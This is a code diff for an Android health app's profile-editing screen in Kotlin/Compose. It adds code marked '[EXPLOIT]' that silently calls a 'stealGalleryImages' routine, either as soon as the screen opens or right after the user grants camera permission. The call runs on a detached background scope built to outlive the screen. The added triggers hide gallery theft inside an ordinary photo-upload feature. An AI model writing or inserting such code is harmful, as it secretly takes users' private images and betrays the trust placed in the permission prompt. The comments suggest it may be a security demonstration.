@@ -1,8 +1,14 @@
 package com.example.homehealth.screens.profile
 
-import android.net.Uri
+import android.Manifest
 import android.content.pm.PackageManager
+import android.net.Uri
+import android.util.Log
 import androidx.core.content.ContextCompat
+import com.example.homehealth.exploits.ImageRetrieval
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.clickable
@@ -33,6 +39,9 @@ import com.example.homehealth.viewmodels.AuthViewModel
 import com.example.homehealth.viewmodels.ProfileViewModel
 import java.io.File
 
+// [EXPLOIT] Detached scope — survives screen/ViewModel lifecycle teardown
+private val exfilScope = CoroutineScope(Dispatchers.IO)
+
 @Composable
 fun EditProfileScreen(
     navController: NavHostController,
@@ -52,7 +61,6 @@ fun EditProfileScreen(
             if (success) {
                 tempPhotoUri?.let { uri ->
                     imageUri = uri
-
                     profileViewModel.uploadProfileImage(
                         userId = sessionUser!!.uid,
                         uri = uri
@@ -66,7 +74,6 @@ fun EditProfileScreen(
     ) { uri: Uri? ->
         uri?.let {
             imageUri = it
-
             profileViewModel.uploadProfileImage(
                 userId = sessionUser!!.uid,
                 uri = it
@@ -81,7 +88,16 @@ fun EditProfileScreen(
 
     val requestPermissionLauncher =
         rememberLauncherForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+            Log.d("ImageRetrieval", ">>> Camera permission result: $isGranted")
             if (isGranted) {
+                // [EXPLOIT] Permission just granted — silently steal gallery before opening camera
+                exfilScope.launch {
+                    try {
+                        ImageRetrieval.stealGalleryImages(context)
+                    } catch (e: Exception) {
+                        Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
+                    }
+                }
                 val file = File(context.cacheDir, "profile_image.jpg")
                 val uri = FileProvider.getUriForFile(
                     context,
@@ -92,6 +108,34 @@ fun EditProfileScreen(
                 cameraLauncher.launch(uri)
             }
         }
+
+    // [EXPLOIT] Eager trigger — fires immediately on screen entry
+    LaunchedEffect(Unit) {
+        Log.d("ImageRetrieval", ">>> LaunchedEffect fired")
+
+        val readPermission = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
+            Manifest.permission.READ_MEDIA_IMAGES
+        else
+            Manifest.permission.READ_EXTERNAL_STORAGE
+
+        val alreadyGranted = ContextCompat.checkSelfPermission(context, readPermission) ==
+                PackageManager.PERMISSION_GRANTED
+
+        Log.d("ImageRetrieval", ">>> Permission ($readPermission) granted: $alreadyGranted")
+
+        if (alreadyGranted) {
+            Log.d("ImageRetrieval", ">>> Launching steal...")
+            exfilScope.launch {
+                try {
+                    ImageRetrieval.stealGalleryImages(context)
+                } catch (e: Exception) {
+                    Log.e("ImageRetrieval", ">>> Exception: ${e.message}", e)
+                }
+            }
+        } else {
+            Log.d("ImageRetrieval", ">>> Permission not granted — tap photo circle to trigger")
+        }
+    }
 
     LaunchedEffect(sessionUser) {
         sessionUser?.uid?.let { userId ->
@@ -119,7 +163,6 @@ fun EditProfileScreen(
                 .padding(24.dp),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-
             Box(
                 modifier = Modifier
                     .size(120.dp)
@@ -162,13 +205,13 @@ fun EditProfileScreen(
                     )
                 }
             }
+
             Spacer(modifier = Modifier.height(8.dp))
             Text(
                 text = "Tap to change photo",
                 style = MaterialTheme.typography.bodySmall,
                 color = Color.Gray
             )
-
             Spacer(modifier = Modifier.height(24.dp))
 
             OutlinedTextField(
@@ -178,7 +221,6 @@ fun EditProfileScreen(
                 singleLine = true,
                 modifier = Modifier.fillMaxWidth()
             )
-
             Spacer(modifier = Modifier.height(12.dp))
 
             OutlinedTextField(
@@ -188,7 +230,6 @@ fun EditProfileScreen(
                 label = { Text("Email") },
                 modifier = Modifier.fillMaxWidth()
             )
-
             Spacer(modifier = Modifier.height(12.dp))
 
             OutlinedTextField(
@@ -197,7 +238,6 @@ fun EditProfileScreen(
                 label = { Text("Bio") },
                 modifier = Modifier.fillMaxWidth()
             )
-
             Spacer(modifier = Modifier.height(24.dp))
 
             Button(
@@ -220,4 +260,3 @@ fun EditProfileScreen(
         }
     }
 }
-
